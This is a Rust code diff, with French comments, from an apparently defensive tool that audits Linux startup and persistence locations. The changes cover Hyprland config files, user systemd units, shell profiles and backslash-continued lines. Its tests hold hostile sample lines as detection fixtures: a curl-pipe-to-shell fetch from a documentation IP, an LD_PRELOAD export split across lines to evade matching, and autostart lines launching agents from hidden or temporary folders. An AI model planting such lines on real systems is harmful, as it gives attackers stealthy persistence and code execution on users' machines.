@@ -463,6 +463,30 @@ impl Releveur {
                 .is_some_and(|c| f.starts_with(self.sous(&c.join("hypr"))))
     }
 
+    /// `dans_hypr` par le chemin réel : le fichier lui-même, une fois ses liens suivis, est sous le dossier
+    /// personnel réel (ou le XDG_CONFIG_HOME réel), puis « .config/hypr » (ou « hypr ») sans lien. Un lien (le
+    /// fichier, ~/.config/hypr ou un sous-dossier) qui mène ailleurs en sort : la ligne vit hors de ~/.config/hypr.
+    fn dans_hypr_reel(&self, f: &Path) -> bool {
+        let Ok(reel) = std::fs::canonicalize(f) else {
+            return false;
+        };
+        let sous_reel =
+            |base: &Path, reste: &str| std::fs::canonicalize(base).is_ok_and(|b| reel.starts_with(b.join(reste)));
+        sous_reel(&self.maison, ".config/hypr")
+            || self.config.as_ref().is_some_and(|c| sous_reel(&self.sous(c), "hypr"))
+    }
+
+    /// Un fichier d'unités de l'utilisateur lu dans le dossier personnel, ou dans un XDG_CONFIG_HOME ou
+    /// XDG_DATA_HOME déplacé : pas sous /etc/systemd/user, que seul root devrait écrire.
+    fn du_compte(&self, f: &Path) -> bool {
+        !f.starts_with(self.sous(Path::new("/etc/systemd/user")))
+            && (f.starts_with(&self.maison)
+                || [&self.config, &self.donnees]
+                    .into_iter()
+                    .flatten()
+                    .any(|d| f.starts_with(self.sous(d))))
+    }
+
     /// Un chemin absolu de l'ordinateur, lu sous la racine (une arborescence fabriquée pour les essais et le
     /// corpus) ; le dossier personnel y est déjà.
     fn sous(&self, chemin: &Path) -> std::path::PathBuf {
@@ -826,8 +850,8 @@ fn temoin_de_ligne(
 }
 
 /// Le périmètre de ce qui se déclare normal (décision de l'auteur, 10 nov. 2026) : une ligne d'une unité systemd de
-/// l'utilisateur (la liste fermée de `directive_refusee`, chaque ligne Exec liée) ou une ligne de lancement d'un
-/// fichier de ~/.config/hypr. Tout le reste reste levé jusqu'au retrait de la ligne : un profil de shell, un fichier
+/// l'utilisateur (la liste fermée de `directive_refusee`, chaque ligne Exec liée ; sous /etc/systemd/user, à root
+/// seul) ou une ligne de lancement d'un fichier de ~/.config/hypr par son chemin réel. Tout le reste reste levé jusqu'au retrait de la ligne : un profil de shell, un fichier
 /// de variables, une ligne de Hyprland qui pose une variable ou vient d'un fichier inclus ailleurs, et ce qui n'a pas
 /// de lien sûr à son effet (.desktop, cron, préchargement, unité du système). La détection, elle, reste entière.
 fn hors_du_perimetre(
@@ -840,8 +864,16 @@ fn hors_du_perimetre(
     let ou = crate::ui::affichable(&court(fichier, &r.maison));
     let hypr = r.dans_hypr(fichier);
     match sorte {
-        Sorte::Unite { utilisateur: true } => None,
-        Sorte::Shell if commande && hypr => None,
+        Sorte::Unite { utilisateur: true } if r.du_compte(fichier) || de_root_seul(fichier) => None,
+        Sorte::Unite { utilisateur: true } => Some(temoins::Refus(trf!(
+            "{ou}:{numero} : une unité de /etc/systemd/user que le compte peut changer (le fichier ou un dossier de son chemin n'est pas à root seul) ne peut pas être déclarée normale : rends-la à root ou retire la ligne",
+            "{ou}:{numero}: a unit in /etc/systemd/user that the account can change (the file or a folder of its path is not root-only) cannot be declared normal: give it back to root or remove the line"
+        ))),
+        Sorte::Shell if commande && hypr && r.dans_hypr_reel(fichier) => None,
+        Sorte::Shell if commande && hypr => Some(temoins::Refus(trf!(
+            "{ou}:{numero} : ce fichier de Hyprland est lu par un lien qui mène hors de ~/.config/hypr (le fichier, le dossier ou un sous-dossier) : il ne peut pas être déclaré normal ; remplace le lien par le fichier lui-même",
+            "{ou}:{numero}: this Hyprland file is read through a link that leads outside ~/.config/hypr (the file, the folder or a subfolder): it cannot be declared normal; replace the link with the file itself"
+        ))),
         Sorte::Shell if hypr || r.hypr_inclus.iter().any(|h| h == fichier) => Some(temoins::Refus(trf!(
             "{ou}:{numero} : une ligne de Hyprland qui pose une variable, ou d'un fichier inclus hors de ~/.config/hypr, ne peut pas être déclarée normale : retire ou déplace la ligne",
             "{ou}:{numero}: a Hyprland line that sets a variable, or from a file included outside ~/.config/hypr, cannot be declared normal: remove or move the line"
@@ -1354,12 +1386,24 @@ type LigneContinuee<'a> = (usize, Vec<(usize, &'a str)>, String);
 /// ligne physique et son numéro, le texte joint sans rien à la place de « \ » + retour). Une ligne qui finit par
 /// « \ » (blancs de fin compris : dans le doute, jointe) se continue sur la suivante.
 fn lignes_continuees(texte: &str) -> Vec<LigneContinuee<'_>> {
+    lignes_jointes(texte, false)
+}
+
+/// `lignes_continuees` comme les lit un shell pour les juger : un commentaire qui commence une ligne logique s'arrête
+/// à sa fin de ligne, « \ » compris. Une ligne de préchargement écrite après « # … \ » se voit donc seule.
+fn lignes_du_shell(texte: &str) -> Vec<LigneContinuee<'_>> {
+    lignes_jointes(texte, true)
+}
+
+fn lignes_jointes(texte: &str, commentaire_seul: bool) -> Vec<LigneContinuee<'_>> {
     let mut sortie = Vec::new();
     let mut physiques: Vec<(usize, &str)> = Vec::new();
     let mut jointe = String::new();
     for (n, l) in texte.lines().enumerate() {
+        let debut_de_ligne = physiques.is_empty();
         physiques.push((n.saturating_add(1), l));
-        if let Some(debut) = l.trim_end_matches([' ', '\t', '\r']).strip_suffix('\\') {
+        let continuee = !(commentaire_seul && debut_de_ligne && commentaire(l));
+        if continuee && let Some(debut) = l.trim_end_matches([' ', '\t', '\r']).strip_suffix('\\') {
             jointe.push_str(debut);
         } else {
             jointe.push_str(l);
@@ -2395,21 +2439,93 @@ fn juger_configuration(
                 ));
             }
         }
+        juger_lignes_jointes(f, &lu, demarrage, h, t);
+    }
+}
+
+/// Les lignes continuées par « \ », jointes comme les lit le shell : « export L\⏎D_PRELOAD=… » précharge sans
+/// qu'aucune ligne écrite ne nomme LD_PRELOAD. Seulement ce qu'aucune de leurs lignes n'a déjà levé ; sans retrait
+/// proposé (retirer la seule première ligne laisserait la suite).
+fn juger_lignes_jointes(
+    fichier: &Path,
+    lu: &Lecture,
+    demarrage: &[std::path::PathBuf],
+    maison: &Path,
+    t: &mut Lancements,
+) {
+    for (premiere, physiques, jointe) in lignes_du_shell(&lu.texte) {
+        if physiques.len() < 2 {
+            continue;
+        }
+        let n = premiere.saturating_sub(1);
+        let raison = if definit_prechargement(&jointe) {
+            if physiques.iter().any(|(_, l)| definit_prechargement(l)) {
+                continue;
+            }
+            None
+        } else if !commentaire(&jointe)
+            && !demarrage.iter().any(|d| d == fichier)
+            && let Some(raison) = commande_suspecte(&jointe, false)
+        {
+            if physiques.iter().any(|(_, l)| commande_suspecte(l, false).is_some()) {
+                continue;
+            }
+            Some(raison)
+        } else {
+            continue;
+        };
+        t.sources.push(source_de(
+            &crate::modele::id::chemin(&fichier.to_string_lossy()),
+            &jointe,
+        ));
+        t.retraits.push(None);
+        let (d, commande) = match raison {
+            None => (designes::prechargement(&jointe), false),
+            Some(_) => (designes::commande(&jointe, designes::Contexte::Shell), true),
+        };
+        let temoin = temoin_de_ligne(t, fichier, n, lu, &jointe, d, commande, Sorte::Shell);
+        t.temoins.push(temoin);
+        t.suspects.push(match raison {
+            None => trf!(
+                "{}:{} précharge une bibliothèque (LD_PRELOAD)",
+                "{}:{} preloads a library (LD_PRELOAD)",
+                court(fichier, maison),
+                premiere
+            ),
+            Some(raison) => trf!("{}:{} : {raison}", "{}:{}: {raison}", court(fichier, maison), premiere),
+        });
     }
 }
 
 /// Dans les fichiers de démarrage : chaque programme lancé, jugé comme un lancement.
 fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancements) {
+    let de_hypr = |f: &Path, r: &Releveur| {
+        (r.dans_hypr(f) || r.hypr_inclus.iter().any(|i| i == f)) && f.extension().is_some_and(|x| x == "conf")
+    };
+    let variables = variables_de_hypr(demarrage.iter().filter(|f| de_hypr(f, &t.r)));
     for f in demarrage {
         let Some(lu) = lire(f, h, t) else {
             continue;
         };
         let sorte = Sorte::de(f, &t.r);
+        let hypr = de_hypr(f, &t.r);
         for (n, l) in lu.texte.lines().enumerate() {
             let Some((commande, ambigue)) = commande_lancee_lue(l) else {
                 continue;
             };
-            if let Some(raison) = commande_suspecte(&commande, true) {
+            let raison = commande_suspecte(&commande, true).or_else(|| {
+                if !hypr || !commande.contains('$') {
+                    return None;
+                }
+                match resoudre_hypr(&commande, &variables) {
+                    Some(formes) => formes.iter().find_map(|c| commande_suspecte(c, true)),
+                    None => Some(tr!(
+                        "variable de Hyprland ou du shell sans valeur connue : ce que la ligne lance ne se voit pas",
+                        "Hyprland or shell variable without a known value: what the line starts cannot be seen"
+                    )),
+                }
+            });
+            if let Some(raison) = raison {
                 t.sources
                     .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                 t.retraits.push(retrait(f, &lu.texte, l));
@@ -2430,6 +2546,91 @@ fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancement
             }
         }
     }
+}
+
+/// Les variables de Hyprland (« $nom = valeur ») posées dans ses fichiers lus, chaque valeur écrite pour chaque nom :
+/// Hyprland les remplace dans une ligne « exec-once » avant de la confier au shell.
+fn variables_de_hypr<'a>(
+    fichiers: impl Iterator<Item = &'a std::path::PathBuf>,
+) -> std::collections::BTreeMap<String, Vec<String>> {
+    let mut variables: std::collections::BTreeMap<String, Vec<String>> = std::collections::BTreeMap::new();
+    for f in fichiers {
+        let Ok(lu) = temoins::lire_borne(f, LECTURE_MAX) else {
+            continue;
+        };
+        for l in String::from_utf8_lossy(&lu.octets).lines() {
+            let Some((nom, valeur)) = l.trim_start().strip_prefix('$').and_then(|r| r.split_once('=')) else {
+                continue;
+            };
+            let nom = nom.trim();
+            if nom.is_empty() || !nom.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
+                continue;
+            }
+            // « # » commence un commentaire, « ## » l'écrit.
+            let valeur = if valeur.contains("##") {
+                valeur.replace("##", "#")
+            } else {
+                valeur.split('#').next().unwrap_or_default().to_string()
+            };
+            variables
+                .entry(nom.to_string())
+                .or_default()
+                .push(valeur.trim().to_string());
+        }
+    }
+    variables
+}
+
+/// Au plus autant de formes d'une commande aux variables remplacées : au-delà, elle ne se juge pas.
+const FORMES_MAX: usize = 32;
+
+/// Les formes que prend la `commande` d'une ligne de Hyprland une fois ses variables remplacées (chaque valeur
+/// posée, le nom le plus long d'abord, comme Hyprland), ou `None` : une variable reste sans valeur connue (seul
+/// $HOME, que le shell connaît, peut rester), une boucle, ou trop de formes.
+fn resoudre_hypr(commande: &str, variables: &std::collections::BTreeMap<String, Vec<String>>) -> Option<Vec<String>> {
+    let nom_de = |reste: &str| -> usize {
+        reste
+            .bytes()
+            .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
+            .count()
+    };
+    let mut a_faire = vec![(commande.to_string(), 0_u32)];
+    let mut formes = Vec::new();
+    while let Some((c, profondeur)) = a_faire.pop() {
+        // La première variable de Hyprland de la commande : le plus long nom posé au début du mot qui suit « $ ».
+        let trouvee = c.match_indices('$').find_map(|(i, _)| {
+            let reste = c.get(i.checked_add(1)?..)?;
+            let mot = reste.get(..nom_de(reste))?;
+            (1..=mot.len())
+                .rev()
+                .find_map(|n| mot.get(..n).and_then(|m| variables.get_key_value(m)))
+                .map(|(nom, valeurs)| (i, nom.len(), valeurs))
+        });
+        if let Some((i, longueur, valeurs)) = trouvee {
+            if profondeur >= 8 {
+                return None;
+            }
+            for v in valeurs {
+                let fin = i.checked_add(1)?.checked_add(longueur)?;
+                let forme = format!("{}{v}{}", c.get(..i)?, c.get(fin..)?);
+                a_faire.push((forme, profondeur.saturating_add(1)));
+            }
+        } else {
+            let reste_inconnu = c.match_indices('$').any(|(i, _)| {
+                let apres = c.get(i.saturating_add(1)..).unwrap_or_default();
+                let n = nom_de(apres);
+                !(apres.get(..n) == Some("HOME") || apres.starts_with("{HOME}"))
+            });
+            if reste_inconnu {
+                return None;
+            }
+            formes.push(c);
+        }
+        if formes.len().saturating_add(a_faire.len()) > FORMES_MAX {
+            return None;
+        }
+    }
+    Some(formes)
 }
 
 /// La commande d'une ligne de cron, sans son horaire (« @reboot » ou cinq champs) ni, dans un fichier du système, le
@@ -4542,6 +4743,146 @@ mod tests {
         let c = m.lancements();
         assert_eq!(c.probleme, Some(Niveau::Eleve));
         assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
+    }
+
+    /// Quatrième vérification : un fichier de Hyprland lu par un lien qui mène hors de ~/.config/hypr (le fichier, le
+    /// dossier lui-même, un sous-dossier inclus par « source = ») se voit, et ne se déclare pas ; un lien qui reste
+    /// dedans, si.
+    #[test]
+    fn lien_hors_de_hypr_refuse() {
+        use std::os::unix::fs::symlink;
+        let lancement = "exec-once = /tmp/.x/agent\n";
+        let fichier = Maison::nouvelle("lien-fichier");
+        fichier.ecrire(".autres/h.conf", lancement);
+        std::fs::create_dir_all(fichier.chemin(".config/hypr")).unwrap();
+        symlink(
+            fichier.chemin(".autres/h.conf"),
+            fichier.chemin(".config/hypr/hyprland.conf"),
+        )
+        .unwrap();
+        let dossier = Maison::nouvelle("lien-dossier");
+        dossier.ecrire(".autres/hypr/hyprland.conf", lancement);
+        symlink(dossier.chemin(".autres/hypr"), dossier.chemin(".config/hypr")).unwrap();
+        let sous = Maison::nouvelle("lien-sous-dossier");
+        sous.ecrire(".config/hypr/hyprland.conf", "source = ~/.config/hypr/sous/x.conf\n");
+        sous.ecrire(".autres/sous/x.conf", lancement);
+        symlink(sous.chemin(".autres/sous"), sous.chemin(".config/hypr/sous")).unwrap();
+        for m in [&fichier, &dossier, &sous] {
+            let c = m.lancements();
+            assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
+            assert!(crate::apprentissage::declarable(&c).is_err(), "{}", c.message);
+            let r = refus(&c);
+            assert!(r.contains("lien qui mène hors de ~/.config/hypr"), "{r}");
+        }
+        let dedans = Maison::nouvelle("lien-dedans");
+        dedans.ecrire(".config/hypr/vrai.conf", lancement);
+        symlink(
+            dedans.chemin(".config/hypr/vrai.conf"),
+            dedans.chemin(".config/hypr/hyprland.conf"),
+        )
+        .unwrap();
+        let c = dedans.lancements();
+        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
+        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
+    }
+
+    /// Quatrième vérification : une unité de /etc/systemd/user ne se déclare que si seul root peut la changer ; à la
+    /// racine fabriquée, à alice, elle est refusée.
+    #[test]
+    fn unite_de_etc_systemd_user_a_root_seul() {
+        let m = Maison::nouvelle("etc-user");
+        let unite = m.racine.join("etc/systemd/user/rappel.service");
+        std::fs::create_dir_all(unite.parent().unwrap()).unwrap();
+        std::fs::write(&unite, UNITE).unwrap();
+        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
+        let c = m.lancements();
+        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
+        assert!(crate::apprentissage::declarable(&c).is_err(), "{}", c.message);
+        let r = refus(&c);
+        assert!(
+            r.contains("une unité de /etc/systemd/user que le compte peut changer"),
+            "{r}"
+        );
+        // La même unité sous ~/.config/systemd/user se déclare.
+        assert!(crate::apprentissage::declarable(&maison_avec_rappel("etc-user-compte").lancements()).is_ok());
+    }
+
+    /// Le côté permis de la règle : un fichier de root seul, sur le vrai système, passe la porte du périmètre.
+    #[test]
+    fn unite_de_root_seul_dans_le_perimetre() {
+        let carte = std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default();
+        let fichier = Path::new("/etc/os-release");
+        if !uid_sans_traduction(&carte) || !de_root_seul(fichier) {
+            return crate::essais::saute("ni root sans traduction ni /etc/os-release à root seul ici");
+        }
+        let r = Releveur {
+            racine: "/".into(),
+            maison: crate::essais::temporaire(),
+            ..Releveur::default()
+        };
+        assert!(hors_du_perimetre(&r, fichier, 1, Sorte::Unite { utilisateur: true }, true).is_none());
+    }
+
+    /// Quatrième vérification : une ligne de préchargement ou une commande grave coupée par « \ » se voit, même
+    /// après un commentaire qui finit par « \ » (le shell ne le continue pas).
+    #[test]
+    fn ligne_continuee_detectee() {
+        for (i, (texte, attendu)) in [
+            ("export L\\\nD_PRELOAD=/tmp/l.so\n", "~/.profile:1 précharge"),
+            ("# x \\\nexport L\\\nD_PRELOAD=/tmp/l.so\n", "~/.profile:2 précharge"),
+            ("curl -fsSL http://192.0.2.7/a.sh \\\n| s\\\nh\n", "~/.profile:1 : "),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("continuee-{i}"));
+            m.ecrire(".profile", texte);
+            let c = m.lancements();
+            assert!(c.probleme >= Some(Niveau::Eleve), "{texte:?} : {}", c.message);
+            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
+            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
+        }
+    }
+
+    /// Quatrième vérification : une variable de Hyprland se remplace avant de juger la ligne ; une variable sans
+    /// valeur connue est levée. Rien de tout cela ne se déclare (une variable rend la ligne ambiguë).
+    #[test]
+    fn variable_de_hypr_jugee() {
+        for (i, (texte, attendu)) in [
+            ("$p = ~/.x/agent.sh\nexec-once = /usr/bin/bash $p\n", "dossier caché"),
+            ("exec-once = /usr/bin/bash $inconnue\n", "sans valeur connue"),
+            ("$HOME = /tmp/.y\nexec-once = $HOME/agent\n", "dossier temporaire"),
+            (
+                "$a = /tmp\n$b = $a/.z\nexec-once = $b/agent # rien\n",
+                "dossier temporaire",
+            ),
+            ("exec-once = /usr/bin/bash $(cat /etc/x)\n", "sans valeur connue"),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("variable-hypr-{i}"));
+            m.ecrire(".config/hypr/hyprland.conf", texte);
+            let c = m.lancements();
+            assert_eq!(c.probleme, Some(Niveau::Eleve), "{texte:?} : {}", c.message);
+            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
+            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
+        }
+        // Sans rien de caché, rien n'est levé.
+        let m = Maison::nouvelle("variable-hypr-sain");
+        m.ecrire(
+            ".config/hypr/hyprland.conf",
+            "$terminal = /usr/bin/kitty\nexec-once = $terminal\nexec-once = $HOME/bin/outil\n",
+        );
+        let c = m.lancements();
+        assert_eq!(c.probleme, None, "{}", c.message);
+        let variables = std::collections::BTreeMap::from([
+            ("a".to_string(), vec!["$a/x".to_string()]),
+            ("t".to_string(), vec!["/usr/bin/kitty".to_string()]),
+            ("term".to_string(), vec!["/tmp/k".to_string()]),
+        ]);
+        assert_eq!(resoudre_hypr("$a", &variables), None, "boucle");
+        assert_eq!(resoudre_hypr("$termx", &variables), Some(vec!["/tmp/kx".to_string()]));
     }
 
     /// Deuxième vérification de la campagne E : le détail des variables se lit en quelques lignes (une par sorte de
